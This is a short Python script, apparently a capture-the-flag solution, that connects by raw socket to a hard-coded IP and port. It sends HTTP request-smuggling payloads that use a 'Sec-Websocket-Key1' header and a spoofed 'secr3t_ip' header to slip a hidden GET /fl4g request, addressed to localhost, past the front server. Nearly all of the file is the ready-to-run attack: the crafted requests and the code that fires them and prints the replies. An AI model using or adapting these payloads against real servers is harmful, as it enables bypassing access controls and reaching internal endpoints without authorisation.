import socket

secret_payload = b'''POST / HTTP/1.1\r
Host: 59.110.159.206:7020\r
Content-Length: 149\r
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded\r
Sec-Websocket-Key1:x\r
\r
xxxxxxxxPOST / HTTP/1.1\r
Host:127.0.0.1\r
secr3t_ip: 127.0.0.1\r
Content-Length: 150\r
Content-Type: application/x-www-form-urlencoded\r
\r
search=abc\r
\r
POST / HTTP/1.1\r
Content-Length: 14\r
Content-Type: application/x-www-form-urlencoded\r
\r
search=111\r
\r
'''

final_payload = b'''POST / HTTP/1.1\r
Host: 59.110.159.206:7020\r
Content-Length: 152\r
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36\r
Content-Type: application/x-www-form-urlencoded\r
Sec-Websocket-Key1:x\r
\r
xxxxxxxxGET /fl4g HTTP/1.1\r
Host:127.0.0.1\r
secr3t_ip: 127.0.0.1\r
Content-Length: 150\r
Content-Type: application/x-www-form-urlencoded\r
\r
search=abc\r
\r
POST / HTTP/1.1\r
Content-Length: 14\r
Content-Type: application/x-www-form-urlencoded\r
\r
search=111\r
\r
'''
test1 = b'''POST / HTTP/1.1\r
Host: 127.0.0.1\r
Content-Length: 67\r
Sec-Websocket-Key1:x\r
\r
xxxxxxxxGET /fl4g HTTP/1.1\r
Host:127.0.0.1\r
Content-Length: 123\r
\r
GET / HTTP/1.1\r
Host: 127.0.0.1\r
\r
'''
test2 = b'''POST / HTTP/1.1
Host: 59.110.159.206:7020
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

search=123'''

sSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sSocket.connect(("59.110.159.206", 7020))


def send(payload):
    print(payload)
    sSocket.send(payload)
    sSocket.settimeout(2)
    response = sSocket.recv(2147483647)
    while len(response) > 0:
        print(response.decode())
        try:
            response = sSocket.recv(2147483647)
        except:
            break
    sSocket.close()


if __name__ == '__main__':
    send(final_payload)
